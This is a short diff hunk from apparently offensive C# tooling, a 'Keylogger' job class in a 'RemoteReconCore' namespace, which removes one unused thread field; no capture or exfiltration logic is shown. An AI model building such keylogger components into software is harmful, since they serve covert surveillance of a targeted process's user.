@@ -11,7 +11,6 @@ namespace RemoteReconCore
     public class Keylogger : IJobs
     {
         private int targetPid;
-        private static Thread t;
         public Keylogger(int pid)
         {
             targetPid = pid;
